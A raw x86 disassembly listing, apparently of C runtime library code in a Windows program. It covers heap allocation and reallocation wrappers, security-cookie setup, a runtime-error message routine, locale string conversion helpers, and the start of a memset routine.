  4258d5:	add    esp,0xc
  4258d8:	test   eax,eax
  4258da:	je     0x4258e1
  4258dc:	mov    DWORD PTR [ebp-0x1c],edi
  4258df:	jmp    0x425919
  4258e1:	push   esi
  4258e2:	call   0x425471
  4258e7:	pop    ecx
  4258e8:	mov    DWORD PTR [ebp-0x1c],eax
  4258eb:	cmp    eax,ebx
  4258ed:	je     0x425919
  4258ef:	mov    eax,DWORD PTR [edi-0x4]
  4258f2:	dec    eax
  4258f3:	mov    DWORD PTR [ebp-0x24],eax
  4258f6:	cmp    eax,esi
  4258f8:	jb     0x4258fc
  4258fa:	mov    eax,esi
  4258fc:	push   eax
  4258fd:	push   edi
  4258fe:	push   DWORD PTR [ebp-0x1c]
  425901:	call   0x4245f0
  425906:	push   edi
  425907:	call   0x424c92
  42590c:	mov    DWORD PTR [ebp-0x20],eax
  42590f:	push   edi
  425910:	push   eax
  425911:	call   0x424cbd
  425916:	add    esp,0x18
  425919:	cmp    DWORD PTR [ebp-0x1c],ebx
  42591c:	jne    0x425969
  42591e:	cmp    esi,ebx
  425920:	jne    0x425928
  425922:	xor    esi,esi
  425924:	inc    esi
  425925:	mov    DWORD PTR [ebp+0xc],esi
  425928:	add    esi,0xf
  42592b:	and    esi,0xfffffff0
  42592e:	mov    DWORD PTR [ebp+0xc],esi
  425931:	push   esi
  425932:	push   ebx
  425933:	push   DWORD PTR ds:0x45d140
  425939:	call   DWORD PTR ds:0x4280a8
  42593f:	mov    DWORD PTR [ebp-0x1c],eax
  425942:	cmp    eax,ebx
  425944:	je     0x425969
  425946:	mov    eax,DWORD PTR [edi-0x4]
  425949:	dec    eax
  42594a:	mov    DWORD PTR [ebp-0x24],eax
  42594d:	cmp    eax,esi
  42594f:	jb     0x425953
  425951:	mov    eax,esi
  425953:	push   eax
  425954:	push   edi
  425955:	push   DWORD PTR [ebp-0x1c]
  425958:	call   0x4245f0
  42595d:	push   edi
  42595e:	push   DWORD PTR [ebp-0x20]
  425961:	call   0x424cbd
  425966:	add    esp,0x14
  425969:	or     DWORD PTR [ebp-0x4],0xffffffff
  42596d:	call   0x4259c1
  425972:	cmp    DWORD PTR [ebp-0x20],ebx
  425975:	jne    0x425999
  425977:	cmp    esi,ebx
  425979:	jne    0x42597e
  42597b:	xor    esi,esi
  42597d:	inc    esi
  42597e:	add    esi,0xf
  425981:	and    esi,0xfffffff0
  425984:	mov    DWORD PTR [ebp+0xc],esi
  425987:	push   esi
  425988:	push   edi
  425989:	push   ebx
  42598a:	push   DWORD PTR ds:0x45d140
  425990:	call   DWORD PTR ds:0x4280b4
  425996:	mov    DWORD PTR [ebp-0x1c],eax
  425999:	mov    eax,DWORD PTR [ebp-0x1c]
  42599c:	cmp    eax,ebx
  42599e:	jne    0x425a00
  4259a0:	cmp    DWORD PTR ds:0x45cdc8,ebx
  4259a6:	je     0x425a00
  4259a8:	push   esi
  4259a9:	call   0x426192
  4259ae:	pop    ecx
  4259af:	test   eax,eax
  4259b1:	jne    0x42589c
  4259b7:	jmp    0x4259fe
  4259b9:	xor    ebx,ebx
  4259bb:	mov    esi,DWORD PTR [ebp+0xc]
  4259be:	mov    edi,DWORD PTR [ebp+0x8]
  4259c1:	push   0x4
  4259c3:	call   0x4239db
  4259c8:	pop    ecx
  4259c9:	ret    
  4259ca:	xor    eax,eax
  4259cc:	cmp    esi,0xffffffe0
  4259cf:	ja     0x4259e7
  4259d1:	cmp    esi,ebx
  4259d3:	jne    0x4259d8
  4259d5:	xor    esi,esi
  4259d7:	inc    esi
  4259d8:	push   esi
  4259d9:	push   edi
  4259da:	push   ebx
  4259db:	push   DWORD PTR ds:0x45d140
  4259e1:	call   DWORD PTR ds:0x4280b4
  4259e7:	cmp    eax,ebx
  4259e9:	jne    0x425a00
  4259eb:	cmp    DWORD PTR ds:0x45cdc8,ebx
  4259f1:	je     0x425a00
  4259f3:	push   esi
  4259f4:	call   0x426192
  4259f9:	pop    ecx
  4259fa:	test   eax,eax
  4259fc:	jne    0x4259ca
  4259fe:	xor    eax,eax
  425a00:	call   0x4238e3
  425a05:	ret    
  425a06:	push   0x10
  425a08:	push   0x428780
  425a0d:	call   0x4238a8
  425a12:	cmp    DWORD PTR ds:0x45d144,0x3
  425a19:	jne    0x425a55
  425a1b:	push   0x4
  425a1d:	call   0x423a6f
  425a22:	pop    ecx
  425a23:	and    DWORD PTR [ebp-0x4],0x0
  425a27:	mov    esi,DWORD PTR [ebp+0x8]
  425a2a:	push   esi
  425a2b:	call   0x424c92
  425a30:	pop    ecx
  425a31:	mov    DWORD PTR [ebp-0x1c],eax
  425a34:	test   eax,eax
  425a36:	je     0x425a43
  425a38:	mov    esi,DWORD PTR [esi-0x4]
  425a3b:	sub    esi,0x9
  425a3e:	mov    DWORD PTR [ebp-0x20],esi
  425a41:	jmp    0x425a46
  425a43:	mov    esi,DWORD PTR [ebp-0x20]
  425a46:	or     DWORD PTR [ebp-0x4],0xffffffff
  425a4a:	call   0x425a73
  425a4f:	cmp    DWORD PTR [ebp-0x1c],0x0
  425a53:	jne    0x425a68
  425a55:	push   DWORD PTR [ebp+0x8]
  425a58:	push   0x0
  425a5a:	push   DWORD PTR ds:0x45d140
  425a60:	call   DWORD PTR ds:0x4280b8
  425a66:	mov    esi,eax
  425a68:	mov    eax,esi
  425a6a:	call   0x4238e3
  425a6f:	ret    
  425a70:	mov    esi,DWORD PTR [ebp-0x20]
  425a73:	push   0x4
  425a75:	call   0x4239db
  425a7a:	pop    ecx
  425a7b:	ret    
  425a7c:	push   ebp
  425a7d:	mov    ebp,esp
  425a7f:	sub    esp,0x10
  425a82:	push   esi
  425a83:	lea    eax,[ebp-0x8]
  425a86:	push   eax
  425a87:	call   DWORD PTR ds:0x4280c8
  425a8d:	mov    esi,DWORD PTR [ebp-0x4]
  425a90:	xor    esi,DWORD PTR [ebp-0x8]
  425a93:	call   DWORD PTR ds:0x4280c4
  425a99:	xor    esi,eax
  425a9b:	call   DWORD PTR ds:0x428070
  425aa1:	xor    esi,eax
  425aa3:	call   DWORD PTR ds:0x4280c0
  425aa9:	xor    esi,eax
  425aab:	lea    eax,[ebp-0x10]
  425aae:	push   eax
  425aaf:	call   DWORD PTR ds:0x4280bc
  425ab5:	mov    eax,DWORD PTR [ebp-0xc]
  425ab8:	xor    eax,DWORD PTR [ebp-0x10]
  425abb:	xor    esi,eax
  425abd:	mov    DWORD PTR ds:0x45c430,esi
  425ac3:	jne    0x425acf
  425ac5:	mov    DWORD PTR ds:0x45c430,0xbb40e64e
  425acf:	pop    esi
  425ad0:	leave  
  425ad1:	ret    
  425ad2:	push   0x118
  425ad7:	push   0x428930
  425adc:	call   0x4238a8
  425ae1:	mov    eax,ds:0x45c430
  425ae6:	xor    eax,DWORD PTR [ebp+0x4]
  425ae9:	mov    DWORD PTR [ebp-0x1c],eax
  425aec:	mov    eax,ds:0x45cd98
  425af1:	xor    ecx,ecx
  425af3:	cmp    eax,ecx
  425af5:	je     0x425b16
  425af7:	mov    DWORD PTR [ebp-0x4],ecx
  425afa:	push   DWORD PTR [ebp+0xc]
  425afd:	push   DWORD PTR [ebp+0x8]
  425b00:	call   eax
  425b02:	pop    ecx
  425b03:	pop    ecx
  425b04:	or     DWORD PTR [ebp-0x4],0xffffffff
  425b08:	jmp    0x425c14
  425b0d:	xor    eax,eax
  425b0f:	inc    eax
  425b10:	ret    
  425b11:	mov    esp,DWORD PTR [ebp-0x18]
  425b14:	jmp    0x425b04
  425b16:	mov    eax,DWORD PTR [ebp+0x8]
  425b19:	dec    eax
  425b1a:	je     0x425b2f
  425b1c:	mov    edi,0x42890c
  425b21:	mov    DWORD PTR [ebp-0x20],0x428858
  425b28:	mov    esi,0xd4
  425b2d:	jmp    0x425b40
  425b2f:	mov    edi,0x428838
  425b34:	mov    DWORD PTR [ebp-0x20],0x428798
  425b3b:	mov    esi,0xb9
  425b40:	mov    BYTE PTR [ebp-0x24],cl
  425b43:	push   0x104
  425b48:	lea    eax,[ebp-0x128]
  425b4e:	push   eax
  425b4f:	push   ecx
  425b50:	call   DWORD PTR ds:0x428040
  425b56:	test   eax,eax
  425b58:	jne    0x425b6d
  425b5a:	push   0x42848c
  425b5f:	lea    eax,[ebp-0x128]
  425b65:	push   eax
  425b66:	call   0x423c90
  425b6b:	pop    ecx
  425b6c:	pop    ecx
  425b6d:	lea    ebx,[ebp-0x128]
  425b73:	lea    eax,[ebp-0x128]
  425b79:	push   eax
  425b7a:	call   0x423ec0
  425b7f:	pop    ecx
  425b80:	add    eax,0xb
  425b83:	cmp    eax,0x3c
  425b86:	jbe    0x425bb1
  425b88:	lea    eax,[ebp-0x128]
  425b8e:	push   eax
  425b8f:	call   0x423ec0
  425b94:	mov    ebx,eax
  425b96:	lea    eax,[ebp-0x128]
  425b9c:	sub    eax,0x31
  425b9f:	add    ebx,eax
  425ba1:	push   0x3
  425ba3:	push   0x428488
  425ba8:	push   ebx
  425ba9:	call   0x423d90
  425bae:	add    esp,0x10
  425bb1:	push   ebx
  425bb2:	call   0x423ec0
  425bb7:	pop    ecx
  425bb8:	lea    eax,[eax+esi*1+0xc]
  425bbc:	add    eax,0x3
  425bbf:	and    eax,0xfffffffc
  425bc2:	call   0x423900
  425bc7:	mov    DWORD PTR [ebp-0x18],esp
  425bca:	mov    esi,esp
  425bcc:	push   edi
  425bcd:	push   esi
  425bce:	call   0x423c90
  425bd3:	mov    edi,0x428468
  425bd8:	push   edi
  425bd9:	push   esi
  425bda:	call   0x423ca0
  425bdf:	push   0x42878c
  425be4:	push   esi
  425be5:	call   0x423ca0
  425bea:	push   ebx
  425beb:	push   esi
  425bec:	call   0x423ca0
  425bf1:	push   edi
  425bf2:	push   esi
  425bf3:	call   0x423ca0
  425bf8:	push   DWORD PTR [ebp-0x20]
  425bfb:	push   esi
  425bfc:	call   0x423ca0
  425c01:	push   0x12010
  425c06:	push   0x428440
  425c0b:	push   esi
  425c0c:	call   0x423b92
  425c11:	add    esp,0x3c
  425c14:	push   0x3
  425c16:	call   0x422d16
  425c1b:	int3   
  425c1c:	push   0x38
  425c1e:	push   0x428d50
  425c23:	call   0x4238a8
  425c28:	xor    ebx,ebx
  425c2a:	cmp    DWORD PTR ds:0x45cdbc,ebx
  425c30:	jne    0x425c6a
  425c32:	push   ebx
  425c33:	push   ebx
  425c34:	xor    esi,esi
  425c36:	inc    esi
  425c37:	push   esi
  425c38:	push   0x428d4c
  425c3d:	push   0x100
  425c42:	push   ebx
  425c43:	call   DWORD PTR ds:0x4280d4
  425c49:	test   eax,eax
  425c4b:	je     0x425c55
  425c4d:	mov    DWORD PTR ds:0x45cdbc,esi
  425c53:	jmp    0x425c6a
  425c55:	call   DWORD PTR ds:0x428014
  425c5b:	cmp    eax,0x78
  425c5e:	jne    0x425c6a
  425c60:	mov    DWORD PTR ds:0x45cdbc,0x2
  425c6a:	cmp    DWORD PTR [ebp+0x14],ebx
  425c6d:	jle    0x425c8a
  425c6f:	mov    ecx,DWORD PTR [ebp+0x14]
  425c72:	mov    eax,DWORD PTR [ebp+0x10]
  425c75:	dec    ecx
  425c76:	cmp    BYTE PTR [eax],bl
  425c78:	je     0x425c82
  425c7a:	inc    eax
  425c7b:	cmp    ecx,ebx
  425c7d:	jne    0x425c75
  425c7f:	or     ecx,0xffffffff
  425c82:	or     eax,0xffffffff
  425c85:	sub    eax,ecx
  425c87:	add    DWORD PTR [ebp+0x14],eax
  425c8a:	mov    eax,ds:0x45cdbc
  425c8f:	cmp    eax,0x2
  425c92:	je     0x425e74
  425c98:	cmp    eax,ebx
  425c9a:	je     0x425e74
  425ca0:	cmp    eax,0x1
  425ca3:	jne    0x425ea7
  425ca9:	xor    edi,edi
  425cab:	mov    DWORD PTR [ebp-0x1c],edi
  425cae:	mov    DWORD PTR [ebp-0x20],ebx
  425cb1:	mov    DWORD PTR [ebp-0x24],ebx
  425cb4:	cmp    DWORD PTR [ebp+0x20],ebx
  425cb7:	jne    0x425cc1
  425cb9:	mov    eax,ds:0x45cdb4
  425cbe:	mov    DWORD PTR [ebp+0x20],eax
  425cc1:	push   ebx
  425cc2:	push   ebx
  425cc3:	push   DWORD PTR [ebp+0x14]
  425cc6:	push   DWORD PTR [ebp+0x10]
  425cc9:	xor    eax,eax
  425ccb:	cmp    DWORD PTR [ebp+0x24],ebx
  425cce:	setne  al
  425cd1:	lea    eax,[eax*8+0x1]
  425cd8:	push   eax
  425cd9:	push   DWORD PTR [ebp+0x20]
  425cdc:	call   DWORD PTR ds:0x4280d0
  425ce2:	mov    esi,eax
  425ce4:	mov    DWORD PTR [ebp-0x28],esi
  425ce7:	cmp    esi,ebx
  425ce9:	je     0x425ea7
  425cef:	mov    DWORD PTR [ebp-0x4],0x1
  425cf6:	lea    eax,[esi+esi*1]
  425cf9:	add    eax,0x3
  425cfc:	and    eax,0xfffffffc
  425cff:	call   0x423900
  425d04:	mov    DWORD PTR [ebp-0x18],esp
  425d07:	mov    eax,esp
  425d09:	mov    DWORD PTR [ebp-0x2c],eax
  425d0c:	or     DWORD PTR [ebp-0x4],0xffffffff
  425d10:	jmp    0x425d2d
  425d12:	xor    eax,eax
  425d14:	inc    eax
  425d15:	ret    
  425d16:	mov    esp,DWORD PTR [ebp-0x18]
  425d19:	call   0x426d45
  425d1e:	xor    ebx,ebx
  425d20:	mov    DWORD PTR [ebp-0x2c],ebx
  425d23:	or     DWORD PTR [ebp-0x4],0xffffffff
  425d27:	mov    edi,DWORD PTR [ebp-0x1c]
  425d2a:	mov    esi,DWORD PTR [ebp-0x28]
  425d2d:	cmp    DWORD PTR [ebp-0x2c],ebx
  425d30:	jne    0x425d4e
  425d32:	lea    eax,[esi+esi*1]
  425d35:	push   eax
  425d36:	call   0x4245d2
  425d3b:	pop    ecx
  425d3c:	mov    DWORD PTR [ebp-0x2c],eax
  425d3f:	cmp    eax,ebx
  425d41:	je     0x425ea7
  425d47:	mov    DWORD PTR [ebp-0x20],0x1
  425d4e:	push   esi
  425d4f:	push   DWORD PTR [ebp-0x2c]
  425d52:	push   DWORD PTR [ebp+0x14]
  425d55:	push   DWORD PTR [ebp+0x10]
  425d58:	push   0x1
  425d5a:	push   DWORD PTR [ebp+0x20]
  425d5d:	call   DWORD PTR ds:0x4280d0
  425d63:	test   eax,eax
  425d65:	je     0x425e51
  425d6b:	push   ebx
  425d6c:	push   ebx
  425d6d:	push   esi
  425d6e:	push   DWORD PTR [ebp-0x2c]
  425d71:	push   DWORD PTR [ebp+0xc]
  425d74:	push   DWORD PTR [ebp+0x8]
  425d77:	call   DWORD PTR ds:0x4280d4
  425d7d:	mov    edi,eax
  425d7f:	mov    DWORD PTR [ebp-0x1c],edi
  425d82:	cmp    edi,ebx
  425d84:	je     0x425e51
  425d8a:	test   BYTE PTR [ebp+0xd],0x4
  425d8e:	je     0x425dbd
  425d90:	cmp    DWORD PTR [ebp+0x1c],ebx
  425d93:	je     0x425e51
  425d99:	cmp    edi,DWORD PTR [ebp+0x1c]
  425d9c:	jg     0x425e51
  425da2:	push   DWORD PTR [ebp+0x1c]
  425da5:	push   DWORD PTR [ebp+0x18]
  425da8:	push   esi
  425da9:	push   DWORD PTR [ebp-0x2c]
  425dac:	push   DWORD PTR [ebp+0xc]
  425daf:	push   DWORD PTR [ebp+0x8]
  425db2:	call   DWORD PTR ds:0x4280d4
  425db8:	jmp    0x425e51
  425dbd:	mov    DWORD PTR [ebp-0x4],0x2
  425dc4:	lea    eax,[edi+edi*1]
  425dc7:	add    eax,0x3
  425dca:	and    eax,0xfffffffc
  425dcd:	call   0x423900
  425dd2:	mov    DWORD PTR [ebp-0x18],esp
  425dd5:	mov    eax,esp
  425dd7:	mov    DWORD PTR [ebp-0x30],eax
  425dda:	or     DWORD PTR [ebp-0x4],0xffffffff
  425dde:	jmp    0x425dfb
  425de0:	xor    eax,eax
  425de2:	inc    eax
  425de3:	ret    
  425de4:	mov    esp,DWORD PTR [ebp-0x18]
  425de7:	call   0x426d45
  425dec:	xor    ebx,ebx
  425dee:	mov    DWORD PTR [ebp-0x30],ebx
  425df1:	or     DWORD PTR [ebp-0x4],0xffffffff
  425df5:	mov    edi,DWORD PTR [ebp-0x1c]
  425df8:	mov    esi,DWORD PTR [ebp-0x28]
  425dfb:	cmp    DWORD PTR [ebp-0x30],ebx
  425dfe:	jne    0x425e18
  425e00:	lea    eax,[edi+edi*1]
  425e03:	push   eax
  425e04:	call   0x4245d2
  425e09:	pop    ecx
  425e0a:	mov    DWORD PTR [ebp-0x30],eax
  425e0d:	cmp    eax,ebx
  425e0f:	je     0x425e51
  425e11:	mov    DWORD PTR [ebp-0x24],0x1
  425e18:	push   edi
  425e19:	push   DWORD PTR [ebp-0x30]
  425e1c:	push   esi
  425e1d:	push   DWORD PTR [ebp-0x2c]
  425e20:	push   DWORD PTR [ebp+0xc]
  425e23:	push   DWORD PTR [ebp+0x8]
  425e26:	call   DWORD PTR ds:0x4280d4
  425e2c:	test   eax,eax
  425e2e:	je     0x425e51
  425e30:	push   ebx
  425e31:	push   ebx
  425e32:	cmp    DWORD PTR [ebp+0x1c],ebx
  425e35:	jne    0x425e3b
  425e37:	push   ebx
  425e38:	push   ebx
  425e39:	jmp    0x425e41
  425e3b:	push   DWORD PTR [ebp+0x1c]
  425e3e:	push   DWORD PTR [ebp+0x18]
  425e41:	push   edi
  425e42:	push   DWORD PTR [ebp-0x30]
  425e45:	push   ebx
  425e46:	push   DWORD PTR [ebp+0x20]
  425e49:	call   DWORD PTR ds:0x428054
  425e4f:	mov    edi,eax
  425e51:	cmp    DWORD PTR [ebp-0x24],ebx
  425e54:	je     0x425e5f
  425e56:	push   DWORD PTR [ebp-0x30]
  425e59:	call   0x4244ba
  425e5e:	pop    ecx
  425e5f:	cmp    DWORD PTR [ebp-0x20],ebx
  425e62:	je     0x425e6d
  425e64:	push   DWORD PTR [ebp-0x2c]
  425e67:	call   0x4244ba
  425e6c:	pop    ecx
  425e6d:	mov    eax,edi
  425e6f:	jmp    0x425fcf
  425e74:	mov    DWORD PTR [ebp-0x34],ebx
  425e77:	xor    edi,edi
  425e79:	mov    DWORD PTR [ebp-0x38],ebx
  425e7c:	cmp    DWORD PTR [ebp+0x8],ebx
  425e7f:	jne    0x425e89
  425e81:	mov    eax,ds:0x45cda4
  425e86:	mov    DWORD PTR [ebp+0x8],eax
  425e89:	cmp    DWORD PTR [ebp+0x20],ebx
  425e8c:	jne    0x425e96
  425e8e:	mov    eax,ds:0x45cdb4
  425e93:	mov    DWORD PTR [ebp+0x20],eax
  425e96:	push   DWORD PTR [ebp+0x8]
  425e99:	call   0x426b2d
  425e9e:	pop    ecx
  425e9f:	mov    DWORD PTR [ebp-0x3c],eax
  425ea2:	cmp    eax,0xffffffff
  425ea5:	jne    0x425eae
  425ea7:	xor    eax,eax
  425ea9:	jmp    0x425fcf
  425eae:	cmp    eax,DWORD PTR [ebp+0x20]
  425eb1:	je     0x425fa5
  425eb7:	push   ebx
  425eb8:	push   ebx
  425eb9:	lea    ecx,[ebp+0x14]
  425ebc:	push   ecx
  425ebd:	push   DWORD PTR [ebp+0x10]
  425ec0:	push   eax
  425ec1:	push   DWORD PTR [ebp+0x20]
  425ec4:	call   0x426b76
  425ec9:	add    esp,0x18
  425ecc:	mov    DWORD PTR [ebp-0x34],eax
  425ecf:	cmp    eax,ebx
  425ed1:	je     0x425ea7
  425ed3:	push   ebx
  425ed4:	push   ebx
  425ed5:	push   DWORD PTR [ebp+0x14]
  425ed8:	push   eax
  425ed9:	push   DWORD PTR [ebp+0xc]
  425edc:	push   DWORD PTR [ebp+0x8]
  425edf:	call   DWORD PTR ds:0x4280cc
  425ee5:	mov    esi,eax
  425ee7:	mov    DWORD PTR [ebp-0x40],esi
  425eea:	cmp    esi,ebx
  425eec:	je     0x425f94
  425ef2:	mov    DWORD PTR [ebp-0x4],ebx
  425ef5:	add    eax,0x3
  425ef8:	and    eax,0xfffffffc
  425efb:	call   0x423900
  425f00:	mov    DWORD PTR [ebp-0x18],esp
  425f03:	mov    edi,esp
  425f05:	mov    DWORD PTR [ebp-0x44],edi
  425f08:	push   esi
  425f09:	push   ebx
  425f0a:	push   edi
  425f0b:	call   0x4261b0
  425f10:	add    esp,0xc
  425f13:	jmp    0x425f25
  425f15:	xor    eax,eax
  425f17:	inc    eax
  425f18:	ret    
  425f19:	mov    esp,DWORD PTR [ebp-0x18]
  425f1c:	call   0x426d45
  425f21:	xor    ebx,ebx
  425f23:	xor    edi,edi
  425f25:	or     DWORD PTR [ebp-0x4],0xffffffff
  425f29:	cmp    edi,ebx
  425f2b:	jne    0x425f50
  425f2d:	push   DWORD PTR [ebp-0x40]
  425f30:	call   0x4245d2
  425f35:	pop    ecx
  425f36:	mov    edi,eax
  425f38:	cmp    edi,ebx
  425f3a:	je     0x425f6d
  425f3c:	push   DWORD PTR [ebp-0x40]
  425f3f:	push   ebx
  425f40:	push   edi
  425f41:	call   0x4261b0
  425f46:	add    esp,0xc
  425f49:	mov    DWORD PTR [ebp-0x38],0x1
  425f50:	push   DWORD PTR [ebp-0x40]
  425f53:	push   edi
  425f54:	push   DWORD PTR [ebp+0x14]
  425f57:	push   DWORD PTR [ebp-0x34]
  425f5a:	push   DWORD PTR [ebp+0xc]
  425f5d:	push   DWORD PTR [ebp+0x8]
  425f60:	call   DWORD PTR ds:0x4280cc
  425f66:	mov    DWORD PTR [ebp-0x40],eax
  425f69:	cmp    eax,ebx
  425f6b:	jne    0x425f71
  425f6d:	xor    esi,esi
  425f6f:	jmp    0x425f97
  425f71:	push   DWORD PTR [ebp+0x1c]
  425f74:	push   DWORD PTR [ebp+0x18]
  425f77:	lea    eax,[ebp-0x40]
  425f7a:	push   eax
  425f7b:	push   edi
  425f7c:	push   DWORD PTR [ebp+0x20]
  425f7f:	push   DWORD PTR [ebp-0x3c]
  425f82:	call   0x426b76
  425f87:	add    esp,0x18
  425f8a:	mov    esi,eax
  425f8c:	neg    esi
  425f8e:	sbb    esi,esi
  425f90:	neg    esi
  425f92:	jmp    0x425f97
  425f94:	mov    esi,DWORD PTR [ebp-0x48]
  425f97:	cmp    DWORD PTR [ebp-0x38],ebx
  425f9a:	je     0x425fbf
  425f9c:	push   edi
  425f9d:	call   0x4244ba
  425fa2:	pop    ecx
  425fa3:	jmp    0x425fbf
  425fa5:	push   DWORD PTR [ebp+0x1c]
  425fa8:	push   DWORD PTR [ebp+0x18]
  425fab:	push   DWORD PTR [ebp+0x14]
  425fae:	push   DWORD PTR [ebp+0x10]
  425fb1:	push   DWORD PTR [ebp+0xc]
  425fb4:	push   DWORD PTR [ebp+0x8]
  425fb7:	call   DWORD PTR ds:0x4280cc
  425fbd:	mov    esi,eax
  425fbf:	cmp    DWORD PTR [ebp-0x34],ebx
  425fc2:	je     0x425fcd
  425fc4:	push   DWORD PTR [ebp-0x34]
  425fc7:	call   0x4244ba
  425fcc:	pop    ecx
  425fcd:	mov    eax,esi
  425fcf:	lea    esp,[ebp-0x54]
  425fd2:	call   0x4238e3
  425fd7:	ret    
  425fd8:	push   0x1c
  425fda:	push   0x428d78
  425fdf:	call   0x4238a8
  425fe4:	xor    esi,esi
  425fe6:	cmp    DWORD PTR ds:0x45cdc0,esi
  425fec:	jne    0x426023
  425fee:	lea    eax,[ebp-0x1c]
  425ff1:	push   eax
  425ff2:	xor    edi,edi
  425ff4:	inc    edi
  425ff5:	push   edi
  425ff6:	push   0x428d4c
  425ffb:	push   edi
  425ffc:	call   DWORD PTR ds:0x4280dc
  426002:	test   eax,eax
  426004:	je     0x42600e
  426006:	mov    DWORD PTR ds:0x45cdc0,edi
  42600c:	jmp    0x426023
  42600e:	call   DWORD PTR ds:0x428014
  426014:	cmp    eax,0x78
  426017:	jne    0x426023
  426019:	mov    DWORD PTR ds:0x45cdc0,0x2
  426023:	mov    eax,ds:0x45cdc0
  426028:	cmp    eax,0x2
  42602b:	je     0x42611b
  426031:	cmp    eax,esi
  426033:	je     0x42611b
  426039:	cmp    eax,0x1
  42603c:	jne    0x426141
  426042:	mov    DWORD PTR [ebp-0x20],esi
  426045:	mov    DWORD PTR [ebp-0x24],esi
  426048:	cmp    DWORD PTR [ebp+0x18],esi
  42604b:	jne    0x426055
  42604d:	mov    eax,ds:0x45cdb4
  426052:	mov    DWORD PTR [ebp+0x18],eax
  426055:	push   esi
  426056:	push   esi
  426057:	push   DWORD PTR [ebp+0x10]
  42605a:	push   DWORD PTR [ebp+0xc]
  42605d:	xor    eax,eax
  42605f:	cmp    DWORD PTR [ebp+0x20],esi
  426062:	setne  al
  426065:	lea    eax,[eax*8+0x1]
  42606c:	push   eax
  42606d:	push   DWORD PTR [ebp+0x18]
  426070:	call   DWORD PTR ds:0x4280d0
  426076:	mov    edi,eax
  426078:	mov    DWORD PTR [ebp-0x28],edi
  42607b:	test   edi,edi
  42607d:	je     0x426141
  426083:	and    DWORD PTR [ebp-0x4],0x0
  426087:	lea    ebx,[edi+edi*1]
  42608a:	mov    eax,ebx
  42608c:	add    eax,0x3
  42608f:	and    eax,0xfffffffc
  426092:	call   0x423900
  426097:	mov    DWORD PTR [ebp-0x18],esp
  42609a:	mov    esi,esp
  42609c:	mov    DWORD PTR [ebp-0x2c],esi
  42609f:	push   ebx
  4260a0:	push   0x0
  4260a2:	push   esi
  4260a3:	call   0x4261b0
  4260a8:	add    esp,0xc
  4260ab:	or     DWORD PTR [ebp-0x4],0xffffffff
  4260af:	jmp    0x4260c6
  4260b1:	xor    eax,eax
  4260b3:	inc    eax
  4260b4:	ret    
  4260b5:	mov    esp,DWORD PTR [ebp-0x18]
  4260b8:	call   0x426d45
  4260bd:	xor    esi,esi
  4260bf:	or     DWORD PTR [ebp-0x4],0xffffffff
  4260c3:	mov    edi,DWORD PTR [ebp-0x28]
  4260c6:	test   esi,esi
  4260c8:	jne    0x4260e1
  4260ca:	push   edi
  4260cb:	push   0x2
  4260cd:	call   0x4249c8
  4260d2:	pop    ecx
  4260d3:	pop    ecx
  4260d4:	mov    esi,eax
  4260d6:	test   esi,esi
  4260d8:	je     0x426141
  4260da:	mov    DWORD PTR [ebp-0x24],0x1
  4260e1:	push   edi
  4260e2:	push   esi
  4260e3:	push   DWORD PTR [ebp+0x10]
  4260e6:	push   DWORD PTR [ebp+0xc]
  4260e9:	push   0x1
  4260eb:	push   DWORD PTR [ebp+0x18]
  4260ee:	call   DWORD PTR ds:0x4280d0
  4260f4:	test   eax,eax
  4260f6:	je     0x426109
  4260f8:	push   DWORD PTR [ebp+0x14]
  4260fb:	push   eax
  4260fc:	push   esi
  4260fd:	push   DWORD PTR [ebp+0x8]
  426100:	call   DWORD PTR ds:0x4280dc
  426106:	mov    DWORD PTR [ebp-0x20],eax
  426109:	cmp    DWORD PTR [ebp-0x24],0x0
  42610d:	je     0x426116
  42610f:	push   esi
  426110:	call   0x4244ba
  426115:	pop    ecx
  426116:	mov    eax,DWORD PTR [ebp-0x20]
  426119:	jmp    0x426189
  42611b:	mov    ebx,DWORD PTR [ebp+0x1c]
  42611e:	cmp    ebx,esi
  426120:	jne    0x426128
  426122:	mov    ebx,DWORD PTR ds:0x45cda4
  426128:	mov    edi,DWORD PTR [ebp+0x18]
  42612b:	test   edi,edi
  42612d:	jne    0x426135
  42612f:	mov    edi,DWORD PTR ds:0x45cdb4
  426135:	push   ebx
  426136:	call   0x426b2d
  42613b:	pop    ecx
  42613c:	cmp    eax,0xffffffff
  42613f:	jne    0x426145
  426141:	xor    eax,eax
  426143:	jmp    0x426189
  426145:	cmp    eax,edi
  426147:	je     0x426167
  426149:	push   0x0
  42614b:	push   0x0
  42614d:	lea    ecx,[ebp+0x10]
  426150:	push   ecx
  426151:	push   DWORD PTR [ebp+0xc]
  426154:	push   eax
  426155:	push   edi
  426156:	call   0x426b76
  42615b:	add    esp,0x18
  42615e:	mov    esi,eax
  426160:	test   esi,esi
  426162:	je     0x426141
  426164:	mov    DWORD PTR [ebp+0xc],esi
  426167:	push   DWORD PTR [ebp+0x14]
  42616a:	push   DWORD PTR [ebp+0x10]
  42616d:	push   DWORD PTR [ebp+0xc]
  426170:	push   DWORD PTR [ebp+0x8]
  426173:	push   ebx
  426174:	call   DWORD PTR ds:0x4280d8
  42617a:	mov    edi,eax
  42617c:	test   esi,esi
  42617e:	je     0x426187
  426180:	push   esi
  426181:	call   0x4244ba
  426186:	pop    ecx
  426187:	mov    eax,edi
  426189:	lea    esp,[ebp-0x38]
  42618c:	call   0x4238e3
  426191:	ret    
  426192:	mov    eax,ds:0x45cdc4
  426197:	test   eax,eax
  426199:	je     0x4261aa
  42619b:	push   DWORD PTR [esp+0x4]
  42619f:	call   eax
  4261a1:	test   eax,eax
  4261a3:	pop    ecx
  4261a4:	je     0x4261aa
  4261a6:	xor    eax,eax
  4261a8:	inc    eax
  4261a9:	ret    
  4261aa:	xor    eax,eax
  4261ac:	ret    
  4261ad:	int3   
  4261ae:	int3   
  4261af:	int3   
  4261b0:	mov    edx,DWORD PTR [esp+0xc]
  4261b4:	mov    ecx,DWORD PTR [esp+0x4]
  4261b8:	test   edx,edx
  4261ba:	je     0x42620b
  4261bc:	xor    eax,eax
  4261be:	mov    al,BYTE PTR [esp+0x8]
  4261c2:	push   edi
  4261c3:	mov    edi,ecx
  4261c5:	cmp    edx,0x4
  4261c8:	jb     0x4261fb
  4261ca:	neg    ecx
  4261cc:	and    ecx,0x3
  4261cf:	je     0x4261dd
  4261d1:	sub    edx,ecx
  4261d3:	mov    BYTE PTR [edi],al
  4261d5:	add    edi,0x1
  4261d8:	sub    ecx,0x1
  4261db:	jne    0x4261d3
  4261dd:	mov    ecx,eax
  4261df:	shl    eax,0x8
  4261e2:	add    eax,ecx
  4261e4:	mov    ecx,eax
  4261e6:	shl    eax,0x10
